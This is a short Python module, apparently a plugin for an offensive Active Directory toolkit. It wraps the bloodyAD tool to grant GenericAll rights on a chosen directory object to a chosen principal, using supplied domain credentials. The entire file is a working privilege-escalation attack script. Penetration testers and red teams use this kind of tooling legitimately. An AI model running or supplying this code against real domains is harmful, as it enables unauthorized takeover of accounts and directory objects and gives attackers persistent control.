def run(data, cred, args):
    import subprocess

    if not args.extra:
        print("Usage: ad.acl.genericall <target> [principal]")
        return {"success": False}

    target = args.extra[0]
    principal = args.extra[1] if len(args.extra) > 1 else cred["user"]

    cmd = [
        "bloodyAD",
        "-d", data["domain"],
        "--host", data["ip"],
        "-u", cred["user"],
        "-p", cred["secret"],
        "-f", "rc4",
        "add", "genericAll",
        target,
        principal
    ]

    print("[*] " + " ".join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print("[+] GenericAll granted on " + target + " to " + principal)
        return {"success": True, "target": target, "principal": principal}

    print(result.stdout + result.stderr)
    return {"success": False}
